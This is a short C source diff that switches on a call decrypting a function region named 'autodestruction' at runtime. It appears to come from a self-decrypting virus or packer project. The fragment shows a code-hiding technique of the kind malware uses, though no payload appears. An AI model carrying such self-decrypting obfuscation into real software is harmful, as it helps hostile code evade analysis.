@@ -6,8 +6,7 @@
 
 void __exit(const struct s_host *host, struct s_keychain *keychain)
 {
-	(void)keychain;
-//	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
+	decrypt_right(keychain, (char *)autodestruction, (void *)__exit - (void *)autodestruction);
 
 	asm volatile
 	(
